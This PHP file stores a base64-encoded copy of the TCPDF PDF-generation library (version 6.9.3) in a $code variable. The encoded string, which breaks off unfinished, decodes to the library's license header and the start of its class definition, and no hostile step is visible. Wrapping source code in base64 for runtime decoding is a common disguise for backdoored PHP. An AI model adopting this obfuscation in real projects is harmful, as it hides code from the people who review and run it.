<?php
$code = base64_decode('PD9waHAKLy89PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0rCi8vIEZpbGUgbmFtZSAgIDogdGNwZGYucGhwCi8vIFZlcnNpb24gICAgIDogNi45LjMKLy8gQmVnaW4gICAgICAgOiAyMDAyLTA4LTAzCi8vIExhc3QgVXBkYXRlIDogMjAyNS0wNC0xOAovLyBBdXRob3IgICAgICA6IE5pY29sYSBBc3VuaSAtIFRlY25pY2suY29tIExURCAtIHd3dy50ZWNuaWNrLmNvbSAtIGluZm9AdGVjbmljay5jb20KLy8gTGljZW5zZSAgICAgOiBHTlUtTEdQTCB2MyAoaHR0cDovL3d3dy5nbnUub3JnL2NvcHlsZWZ0L2xlc3Nlci5odG1sKQovLyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi8vIENvcHlyaWdodCAoQykgMjAwMi0yMDI1IE5pY29sYSBBc3VuaSAtIFRlY25pY2suY29tIExURAovLwovLyBUaGlzIGZpbGUgaXMgcGFydCBvZiBUQ1BERiBzb2Z0d2FyZSBsaWJyYXJ5LgovLwovLyBUQ1BERiBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgY2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5IGl0Ci8vIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIExlc3NlciBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFzCi8vIHB1Ymxpc2hlZCBieSB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uLCBlaXRoZXIgdmVyc2lvbiAzIG9mIHRoZQovLyBMaWNlbnNlLCBvciAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgovLwovLyBUQ1BERiBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLCBidXQKLy8gV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgovLyBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuCi8vIFNlZSB0aGUgR05VIExlc3NlciBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCi8vCi8vIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIExpY2Vuc2UKLy8gYWxvbmcgd2l0aCBUQ1BERi4gSWYgbm90LCBzZWUKLy8gPGh0dHA6Ly93d3cudGVjbmljay5jb20vcGFnZWZpbGVzL3RjcGRmL0xJQ0VOU0UuVFhUPi4KLy8KLy8gU2VlIExJQ0VOU0UuVFhUIGZpbGUgZm9yIG1vcmUgaW5mb3JtYXRpb24uCi8vIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLy8KLy8gRGVzY3JpcHRpb24gOgovLyAgIFRoaXMgaXMgYSBQSFAgY2xhc3MgZm9yIGdlbmVyYXRpbmcgUERGIGRvY3VtZW50cyB3aXRob3V0IHJlcXVpcmluZyBleHRlcm5hbCBleHRlbnNpb25zLgovLwovLyBOT1RFOgovLyAgIFRoaXMgY2xhc3Mgd2FzIG9yaWdpbmFsbHkgZGVyaXZlZCBpbiAyMDAyIGZyb20gdGhlIFB1YmxpYwovLyAgIERvbWFpbiBGUERGIGNsYXNzIGJ5IE9saXZpZXIgUGxhdGhleSAoaHR0cDovL3d3dy5mcGRmLm9yZyksCi8vICAgYnV0IG5vdyBpcyBhbG1vc3QgZW50aXJlbHkgcmV3cml0dGVuIGFuZCBjb250YWlucyB0aG91c2FuZHMgb2YKLy8gICBuZXcgbGluZXMgb2YgY29kZSBhbmQgaHVuZHJlZHMgbmV3IGZlYXR1cmVzLgovLwovLyBNYWluIGZlYXR1cmVzOgovLyAgKiBubyBleHRlcm5hbCBsaWJyYXJpZXMgYXJlIHJlcXVpcmVkIGZvciB0aGUgYmFzaWMgZnVuY3Rpb25zOwovLyAgKiBhbGwgc3RhbmRhcmQgcGFnZSBmb3JtYXRzLCBjdXN0b20gcGFnZSBmb3JtYXRzLCBjdXN0b20gbWFyZ2lucyBhbmQgdW5pdHMgb2YgbWVhc3VyZTsKLy8gICogVVRGLTggVW5pY29kZSBhbmQgUmlnaHQtVG8tTGVmdCBsYW5ndWFnZXM7Ci8vICAqIFRydWVUeXBlVW5pY29kZSwgVHJ1ZVR5cGUsIFR5cGUxIGFuZCBDSUQtMCBmb250czsKLy8gICogZm9udCBzdWJzZXR0aW5nOwovLyAgKiBtZXRob2RzIHRvIHB1Ymxpc2ggc29tZSBYSFRNTCArIENTUyBjb2RlLCBKYXZhc2NyaXB0IGFuZCBGb3JtczsKLy8gICogaW1hZ2VzLCBncmFwaGljIChnZW9tZXRyaWMgZmlndXJlcykgYW5kIHRyYW5zZm9ybWF0aW9uIG1ldGhvZHM7Ci8vICAqIHN1cHBvcnRzIEpQRUcsIFBORyBhbmQgU1ZHIGltYWdlcyBuYXRpdmVseSwgYWxsIGltYWdlcyBzdXBwb3J0ZWQgYnkgR0QgKEdELCBHRDIsIEdEMlBBUlQsIEdJRiwgSlBFRywgUE5HLCBCTVAsIFhCTSwgWFBNKSBhbmQgYWxsIGltYWdlcyBzdXBwb3J0ZWQgdmlhIEltYWdlTWFnaWNrIChodHRwOi8vd3d3LmltYWdlbWFnaWNrLm9yZy93d3cvZm9ybWF0cy5odG1sKQovLyAgKiAxRCBhbmQgMkQgYmFyY29kZXM6IENPREUgMzksIEFOU0kgTUgxMC44TS0xOTgzLCBVU0QtMywgMyBvZiA5LCBDT0RFIDkzLCBVU1MtOTMsIFN0YW5kYXJkIDIgb2YgNSwgSW50ZXJsZWF2ZWQgMiBvZiA1LCBDT0RFIDEyOCBBL0IvQywgMiBhbmQgNSBEaWdpdHMgVVBDLUJhc2VkIEV4dGVuc2lvbiwgRUFOIDgsIEVBTiAxMywgVVBDLUEsIFVQQy1FLCBNU0ksIFBPU1RORVQsIFBMQU5FVCwgUk1TNENDIChSb3lhbCBNYWlsIDQtc3RhdGUgQ3VzdG9tZXIgQ29kZSksIENCQyAoQ3VzdG9tZXIgQmFyIENvZGUpLCBLSVggKEtsYW50IGluZGV4IC0gQ3VzdG9tZXIgaW5kZXgpLCBJbnRlbGxpZ2VudCBNYWlsIEJhcmNvZGUsIE9uZWNvZGUsIFVTUFMtQi0zMjAwLCBDT0RBQkFSLCBDT0RFIDExLCBQSEFSTUFDT0RFLCBQSEFSTUFDT0RFIFRXTy1UUkFDS1MsIERhdGFtYXRyaXgsIFFSLUNvZGUsIFBERjQxNzsKLy8gICogSlBFRyBhbmQgUE5HIElDQyBwcm9maWxlcywgR3JheXNjYWxlLCBSR0IsIENNWUssIFNwb3QgQ29sb3JzIGFuZCBUcmFuc3BhcmVuY2llczsKLy8gICogYXV0b21hdGljIHBhZ2UgaGVhZGVyIGFuZCBmb290ZXIgbWFuYWdlbWVudDsKLy8gICogZG9jdW1lbnQgZW5jcnlwdGlvbiB1cCB0byAyNTYgYml0IGFuZCBkaWdpdGFsIHNpZ25hdHVyZSBjZXJ0aWZpY2F0aW9uczsKLy8gICogdHJhbnNhY3Rpb25zIHRvIFVORE8gY29tbWFuZHM7Ci8vICAqIFBERiBhbm5vdGF0aW9ucywgaW5jbHVkaW5nIGxpbmtzLCB0ZXh0IGFuZCBmaWxlIGF0dGFjaG1lbnRzOwovLyAgKiB0ZXh0IHJlbmRlcmluZyBtb2RlcyAoZmlsbCwgc3Ryb2tlIGFuZCBjbGlwcGluZyk7Ci8vICAqIG11bHRpcGxlIGNvbHVtbnMgbW9kZTsKLy8gICogbm8td3JpdGUgcGFnZSByZWdpb25zOwovLyAgKiBib29rbWFya3MsIG5hbWVkIGRlc3RpbmF0aW9ucyBhbmQgdGFibGUgb2YgY29udGVudDsKLy8gICogdGV4dCBoeXBoZW5hdGlvbjsKLy8gICogdGV4dCBzdHJldGNoaW5nIGFuZCBzcGFjaW5nICh0cmFja2luZyk7Ci8vICAqIGF1dG9tYXRpYyBwYWdlIGJyZWFrLCBsaW5lIGJyZWFrIGFuZCB0ZXh0IGFsaWdubWVudHMgaW5jbHVkaW5nIGp1c3RpZmljYXRpb247Ci8vICAqIGF1dG9tYXRpYyBwYWdlIG51bWJlcmluZyBhbmQgcGFnZSBncm91cHM7Ci8vICAqIG1vdmUgYW5kIGRlbGV0ZSBwYWdlczsKLy8gICogcGFnZSBjb21wcmVzc2lvbiAocmVxdWlyZXMgcGhwLXpsaWIgZXh0ZW5zaW9uKTsKLy8gICogWE9CamVjdCBUZW1wbGF0ZXM7Ci8vICAqIExheWVycyBhbmQgb2JqZWN0IHZpc2liaWxpdHkuCi8vCSogUERGL0EtMWIgc3VwcG9ydAovLz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSsKCi8qKgogKiBAZmlsZQogKiBUaGlzIGlzIGEgUEhQIGNsYXNzIGZvciBnZW5lcmF0aW5nIFBERiBkb2N1bWVudHMgd2l0aG91dCByZXF1aXJpbmcgZXh0ZXJuYWwgZXh0ZW5zaW9ucy48YnI+CiAqIFRDUERGIHByb2plY3QgKGh0dHA6Ly93d3cudGNwZGYub3JnKSB3YXMgb3JpZ2luYWxseSBkZXJpdmVkIGluIDIwMDIgZnJvbSB0aGUgUHVibGljIERvbWFpbiBGUERGIGNsYXNzIGJ5IE9saXZpZXIgUGxhdGhleSAoaHR0cDovL3d3dy5mcGRmLm9yZyksIGJ1dCBub3cgaXMgYWxtb3N0IGVudGlyZWx5IHJld3JpdHRlbi48YnI+CiAqIDxoMz5UQ1BERiBtYWluIGZlYXR1cmVzIGFyZTo8L2gzPgogKiA8dWw+CiAqIDxsaT5ubyBleHRlcm5hbCBsaWJyYXJpZXMgYXJlIHJlcXVpcmVkIGZvciB0aGUgYmFzaWMgZnVuY3Rpb25zOzwvbGk+CiAqIDxsaT5hbGwgc3RhbmRhcmQgcGFnZSBmb3JtYXRzLCBjdXN0b20gcGFnZSBmb3JtYXRzLCBjdXN0b20gbWFyZ2lucyBhbmQgdW5pdHMgb2YgbWVhc3VyZTs8L2xpPgogKiA8bGk+VVRGLTggVW5pY29kZSBhbmQgUmlnaHQtVG8tTGVmdCBsYW5ndWFnZXM7PC9saT4KICogPGxpPlRydWVUeXBlVW5pY29kZSwgVHJ1ZVR5cGUsIFR5cGUxIGFuZCBDSUQtMCBmb250czs8L2xpPgogKiA8bGk+Zm9udCBzdWJzZXR0aW5nOzwvbGk+CiAqIDxsaT5tZXRob2RzIHRvIHB1Ymxpc2ggc29tZSBYSFRNTCArIENTUyBjb2RlLCBKYXZhc2NyaXB0IGFuZCBGb3Jtczs8L2xpPgogKiA8bGk+aW1hZ2VzLCBncmFwaGljIChnZW9tZXRyaWMgZmlndXJlcykgYW5kIHRyYW5zZm9ybWF0aW9uIG1ldGhvZHM7CiAqIDxsaT5zdXBwb3J0cyBKUEVHLCBQTkcgYW5kIFNWRyBpbWFnZXMgbmF0aXZlbHksIGFsbCBpbWFnZXMgc3VwcG9ydGVkIGJ5IEdEIChHRCwgR0QyLCBHRDJQQVJULCBHSUYsIEpQRUcsIFBORywgQk1QLCBYQk0sIFhQTSkgYW5kIGFsbCBpbWFnZXMgc3VwcG9ydGVkIHZpYSBJbWFnZU1hZ2ljayAoaHR0cDovL3d3dy5pbWFnZW1hZ2ljay5vcmcvd3d3L2Zvcm1hdHMuaHRtbCk8L2xpPgogKiA8bGk+MUQgYW5kIDJEIGJhcmNvZGVzOiBDT0RFIDM5LCBBTlNJIE1IMTAuOE0tMTk4MywgVVNELTMsIDMgb2YgOSwgQ09ERSA5MywgVVNTLTkzLCBTdGFuZGFyZCAyIG9mIDUsIEludGVybGVhdmVkIDIgb2YgNSwgQ09ERSAxMjggQS9CL0MsIDIgYW5kIDUgRGlnaXRzIFVQQy1CYXNlZCBFeHRlbnNpb24sIEVBTiA4LCBFQU4gMTMsIFVQQy1BLCBVUEMtRSwgTVNJLCBQT1NUTkVULCBQTEFORVQsIFJNUzRDQyAoUm95YWwgTWFpbCA0LXN0YXRlIEN1c3RvbWVyIENvZGUpLCBDQkMgKEN1c3RvbWVyIEJhciBDb2RlKSwgS0lYIChLbGFudCBpbmRleCAtIEN1c3RvbWVyIGluZGV4KSwgSW50ZWxsaWdlbnQgTWFpbCBCYXJjb2RlLCBPbmVjb2RlLCBVU1BTLUItMzIwMCwgQ09EQUJBUiwgQ09ERSAxMSwgUEhBUk1BQ09ERSwgUEhBUk1BQ09ERSBUV08tVFJBQ0tTLCBEYXRhbWF0cml4LCBRUi1Db2RlLCBQREY0MTc7PC9saT4KICogPGxpPkpQRUcgYW5kIFBORyBJQ0MgcHJvZmlsZXMsIEdyYXlzY2FsZSwgUkdCLCBDTVlLLCBTcG90IENvbG9ycyBhbmQgVHJhbnNwYXJlbmNpZXM7PC9saT4KICogPGxpPmF1dG9tYXRpYyBwYWdlIGhlYWRlciBhbmQgZm9vdGVyIG1hbmFnZW1lbnQ7PC9saT4KICogPGxpPmRvY3VtZW50IGVuY3J5cHRpb24gdXAgdG8gMjU2IGJpdCBhbmQgZGlnaXRhbCBzaWduYXR1cmUgY2VydGlmaWNhdGlvbnM7PC9saT4KICogPGxpPnRyYW5zYWN0aW9ucyB0byBVTkRPIGNvbW1hbmRzOzwvbGk+CiAqIDxsaT5QREYgYW5ub3RhdGlvbnMsIGluY2x1ZGluZyBsaW5rcywgdGV4dCBhbmQgZmlsZSBhdHRhY2htZW50czs8L2xpPgogKiA8bGk+dGV4dCByZW5kZXJpbmcgbW9kZXMgKGZpbGwsIHN0cm9rZSBhbmQgY2xpcHBpbmcpOzwvbGk+CiAqIDxsaT5tdWx0aXBsZSBjb2x1bW5zIG1vZGU7PC9saT4KICogPGxpPm5vLXdyaXRlIHBhZ2UgcmVnaW9uczs8L2xpPgogKiA8bGk+Ym9va21hcmtzLCBuYW1lZCBkZXN0aW5hdGlvbnMgYW5kIHRhYmxlIG9mIGNvbnRlbnQ7PC9saT4KICogPGxpPnRleHQgaHlwaGVuYXRpb247PC9saT4KICogPGxpPnRleHQgc3RyZXRjaGluZyBhbmQgc3BhY2luZyAodHJhY2tpbmcpOzwvbGk+CiAqIDxsaT5hdXRvbWF0aWMgcGFnZSBicmVhaywgbGluZSBicmVhayBhbmQgdGV4dCBhbGlnbm1lbnRzIGluY2x1ZGluZyBqdXN0aWZpY2F0aW9uOzwvbGk+CiAqIDxsaT5hdXRvbWF0aWMgcGFnZSBudW1iZXJpbmcgYW5kIHBhZ2UgZ3JvdXBzOzwvbGk+CiAqIDxsaT5tb3ZlIGFuZCBkZWxldGUgcGFnZXM7PC9saT4KICogPGxpPnBhZ2UgY29tcHJlc3Npb24gKHJlcXVpcmVzIHBocC16bGliIGV4dGVuc2lvbik7PC9saT4KICogPGxpPlhPQmplY3QgVGVtcGxhdGVzOzwvbGk+CiAqIDxsaT5MYXllcnMgYW5kIG9iamVjdCB2aXNpYmlsaXR5OzwvbGk+CiAqIDxsaT5QREYvQS0xYiBzdXBwb3J0LjwvbGk+CiAqIDwvdWw+CiAqIFRvb2xzIHRvIGVuY29kZSB5b3VyIHVuaWNvZGUgZm9udHMgYXJlIG9uIGZvbnRzL3V0aWxzIGRpcmVjdG9yeS48L3A+CiAqIEBwYWNrYWdlIGNvbS50ZWNuaWNrLnRjcGRmCiAqIEBhdXRob3IgTmljb2xhIEFzdW5pCiAqIEB2ZXJzaW9uIDYuOS4zCiAqLwoKLy8gVENQREYgY29uZmlndXJhdGlvbgpyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuJy90Y3BkZl9hdXRvY29uZmlnLnBocCcpOwovLyBUQ1BERiBzdGF0aWMgZm9udCBtZXRob2RzIGFuZCBkYXRhCnJlcXVpcmVfb25jZShkaXJuYW1lKF9fRklMRV9fKS4nL2luY2x1ZGUvdGNwZGZfZm9udF9kYXRhLnBocCcpOwovLyBUQ1BERiBzdGF0aWMgZm9udCBtZXRob2RzIGFuZCBkYXRhCnJlcXVpcmVfb25jZShkaXJuYW1lKF9fRklMRV9fKS4nL2luY2x1ZGUvdGNwZGZfZm9udHMucGhwJyk7Ci8vIFRDUERGIHN0YXRpYyBjb2xvciBtZXRob2RzIGFuZCBkYXRhCnJlcXVpcmVfb25jZShkaXJuYW1lKF9fRklMRV9fKS4nL2luY2x1ZGUvdGNwZGZfY29sb3JzLnBocCcpOwovLyBUQ1BERiBzdGF0aWMgaW1hZ2UgbWV0aG9kcyBhbmQgZGF0YQpyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuJy9pbmNsdWRlL3RjcGRmX2ltYWdlcy5waHAnKTsKLy8gVENQREYgc3RhdGljIG1ldGhvZHMgYW5kIGRhdGEKcmVxdWlyZV9vbmNlKGRpcm5hbWUoX19GSUxFX18pLicvaW5jbHVkZS90Y3BkZl9zdGF0aWMucGhwJyk7CgovLyAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0KCi8qKgogKiBAY2xhc3MgVENQREYKICogUEhQIGNsYXNzIGZvciBnZW5lcmF0aW5nIFBERiBkb2N1bWVudHMgd2l0aG91dCByZXF1aXJpbmcgZXh0ZXJuYWwgZXh0ZW5zaW9ucy4KICogVENQREYgcHJvamVjdCAoaHR0cDovL3d3dy50Y3BkZi5vcmcpIGhhcyBiZWVuIG9yaWdpbmFsbHkgZGVyaXZlZCBpbiAyMDAyIGZyb20gdGhlIFB1YmxpYyBEb21haW4gRlBERiBjbGFzcyBieSBPbGl2aWVyIFBsYXRoZXkgKGh0dHA6Ly93d3cuZnBkZi5vcmcpLCBidXQgbm93IGlzIGFsbW9zdCBlbnRpcmVseSByZXdyaXR0ZW4uPGJyPgogKiBAcGFja2FnZSBjb20udGVjbmljay50Y3BkZgogKiBAYnJpZWYgUEhQIGNsYXNzIGZvciBnZW5lcmF0aW5nIFBERiBkb2N1bWVudHMgd2l0aG91dCByZXF1aXJpbmcgZXh0ZXJuYWwgZXh0ZW5zaW9ucy4KICogQHZlcnNpb24gNi45LjMKICogQGF1dGhvciBOaWNvbGEgQXN1bmkgLSBpbmZvQHRlY25pY2suY29tCiAqIEBJZ25vcmVBbm5vdGF0aW9uKCJwcm90ZWN0ZWQiKQogKiBASWdub3JlQW5ub3RhdGlvbigicHVibGljIikKICogQElnbm9yZUFubm90YXRpb24oInByZSIpCiAqLwpjbGFzcyBUQ1BERiB7CgoJLy8gUHJvdGVjdGVkIHByb3BlcnRpZXMKCgkvKioKCSAqIEN1cnJlbnQgcGFnZSBudW1iZXIuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkcGFnZTsKCgkvKioKCSAqIEN1cnJlbnQgb2JqZWN0IG51bWJlci4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRuOwoKCS8qKgoJICogQXJyYXkgb2Ygb2JqZWN0IG9mZnNldHMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkb2Zmc2V0cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSBvZiBvYmplY3QgSURzIGZvciBlYWNoIHBhZ2UuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkcGFnZW9iamVjdHMgPSBhcnJheSgpOwoKCS8qKgoJICogQnVmZmVyIGhvbGRpbmcgaW4tbWVtb3J5IFBERi4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRidWZmZXI7CgoJLyoqCgkgKiBBcnJheSBjb250YWluaW5nIHBhZ2VzLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJHBhZ2VzID0gYXJyYXkoKTsKCgkvKioKCSAqIEN1cnJlbnQgZG9jdW1lbnQgc3RhdGUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkc3RhdGU7CgoJLyoqCgkgKiBDb21wcmVzc2lvbiBmbGFnLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGNvbXByZXNzOwoKCS8qKgoJICogQ3VycmVudCBwYWdlIG9yaWVudGF0aW9uIChQID0gUG9ydHJhaXQsIEwgPSBMYW5kc2NhcGUpLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJEN1ck9yaWVudGF0aW9uOwoKCS8qKgoJICogUGFnZSBkaW1lbnNpb25zLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJHBhZ2VkaW0gPSBhcnJheSgpOwoKCS8qKgoJICogU2NhbGUgZmFjdG9yIChudW1iZXIgb2YgcG9pbnRzIGluIHVzZXIgdW5pdCkuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkazsKCgkvKioKCSAqIFdpZHRoIG9mIHBhZ2UgZm9ybWF0IGluIHBvaW50cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRmd1B0OwoKCS8qKgoJICogSGVpZ2h0IG9mIHBhZ2UgZm9ybWF0IGluIHBvaW50cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRmaFB0OwoKCS8qKgoJICogQ3VycmVudCB3aWR0aCBvZiBwYWdlIGluIHBvaW50cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICR3UHQ7CgoJLyoqCgkgKiBDdXJyZW50IGhlaWdodCBvZiBwYWdlIGluIHBvaW50cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRoUHQ7CgoJLyoqCgkgKiBDdXJyZW50IHdpZHRoIG9mIHBhZ2UgaW4gdXNlciB1bml0LgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJHc7CgoJLyoqCgkgKiBDdXJyZW50IGhlaWdodCBvZiBwYWdlIGluIHVzZXIgdW5pdC4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRoOwoKCS8qKgoJICogTGVmdCBtYXJnaW4uCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkbE1hcmdpbjsKCgkvKioKCSAqIFJpZ2h0IG1hcmdpbi4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRyTWFyZ2luOwoKCS8qKgoJICogQ2VsbCBsZWZ0IG1hcmdpbiAodXNlZCBieSByZWdpb25zKS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRjbE1hcmdpbjsKCgkvKioKCSAqIENlbGwgcmlnaHQgbWFyZ2luICh1c2VkIGJ5IHJlZ2lvbnMpLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGNyTWFyZ2luOwoKCS8qKgoJICogVG9wIG1hcmdpbi4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICR0TWFyZ2luOwoKCS8qKgoJICogUGFnZSBicmVhayBtYXJnaW4uCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkYk1hcmdpbjsKCgkvKioKCSAqIEFycmF5IG9mIGNlbGwgaW50ZXJuYWwgcGFkZGluZ3MgKCdUJyA9PiB0b3AsICdSJyA9PiByaWdodCwgJ0InID0+IGJvdHRvbSwgJ0wnID0+IGxlZnQpLgoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMTAtMDMpCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkY2VsbF9wYWRkaW5nID0gYXJyYXkoJ1QnID0+IDAsICdSJyA9PiAwLCAnQicgPT4gMCwgJ0wnID0+IDApOwoKCS8qKgoJICogQXJyYXkgb2YgY2VsbCBtYXJnaW5zICgnVCcgPT4gdG9wLCAnUicgPT4gcmlnaHQsICdCJyA9PiBib3R0b20sICdMJyA9PiBsZWZ0KS4KCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTEwLTA0KQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGNlbGxfbWFyZ2luID0gYXJyYXkoJ1QnID0+IDAsICdSJyA9PiAwLCAnQicgPT4gMCwgJ0wnID0+IDApOwoKCS8qKgoJICogQ3VycmVudCBob3Jpem9udGFsIHBvc2l0aW9uIGluIHVzZXIgdW5pdCBmb3IgY2VsbCBwb3NpdGlvbmluZy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICR4OwoKCS8qKgoJICogQ3VycmVudCB2ZXJ0aWNhbCBwb3NpdGlvbiBpbiB1c2VyIHVuaXQgZm9yIGNlbGwgcG9zaXRpb25pbmcuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkeTsKCgkvKioKCSAqIEhlaWdodCBvZiBsYXN0IGNlbGwgcHJpbnRlZC4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRsYXN0aDsKCgkvKioKCSAqIExpbmUgd2lkdGggaW4gdXNlciB1bml0LgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJExpbmVXaWR0aDsKCgkvKioKCSAqIEFycmF5IG9mIHN0YW5kYXJkIGZvbnQgbmFtZXMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkQ29yZUZvbnRzOwoKCS8qKgoJICogQXJyYXkgb2YgdXNlZCBmb250cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRmb250cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSBvZiBmb250IGZpbGVzLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJEZvbnRGaWxlcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSBvZiBlbmNvZGluZyBkaWZmZXJlbmNlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRkaWZmcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSBvZiB1c2VkIGltYWdlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRpbWFnZXMgPSBhcnJheSgpOwoKCS8qKgoJICogRGVwdGggb2YgdGhlIHN2ZyB0YWcsIHRvIGtlZXAgdHJhY2sgaWYgdGhlIHN2ZyB0YWcgaXMgYSBzdWJ0YWcgb3IgdGhlIHJvb3QgdGFnLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJHN2Z190YWdfZGVwdGggPSAwOwoKCS8qKgoJICogQXJyYXkgb2YgQW5ub3RhdGlvbnMgaW4gcGFnZXMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkUGFnZUFubm90cyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSBvZiBpbnRlcm5hbCBsaW5rcy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRsaW5rcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBDdXJyZW50IGZvbnQgZmFtaWx5LgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJEZvbnRGYW1pbHk7CgoJLyoqCgkgKiBDdXJyZW50IGZvbnQgc3R5bGUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkRm9udFN0eWxlOwoKCS8qKgoJICogQ3VycmVudCBmb250IGFzY2VudCAoZGlzdGFuY2UgYmV0d2VlbiBmb250IHRvcCBhbmQgYmFzZWxpbmUpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuOC4wMDAgKDIwMDctMDMtMjkpCgkgKi8KCXByb3RlY3RlZCAkRm9udEFzY2VudDsKCgkvKioKCSAqIEN1cnJlbnQgZm9udCBkZXNjZW50IChkaXN0YW5jZSBiZXR3ZWVuIGZvbnQgYm90dG9tIGFuZCBiYXNlbGluZSkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMi44LjAwMCAoMjAwNy0wMy0yOSkKCSAqLwoJcHJvdGVjdGVkICRGb250RGVzY2VudDsKCgkvKioKCSAqIFVuZGVybGluaW5nIGZsYWcuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkdW5kZXJsaW5lOwoKCS8qKgoJICogT3ZlcmxpbmluZyBmbGFnLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJG92ZXJsaW5lOwoKCS8qKgoJICogQ3VycmVudCBmb250IGluZm8uCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkQ3VycmVudEZvbnQ7CgoJLyoqCgkgKiBDdXJyZW50IGZvbnQgc2l6ZSBpbiBwb2ludHMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkRm9udFNpemVQdDsKCgkvKioKCSAqIEN1cnJlbnQgZm9udCBzaXplIGluIHVzZXIgdW5pdC4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRGb250U2l6ZTsKCgkvKioKCSAqIENvbW1hbmRzIGZvciBkcmF3aW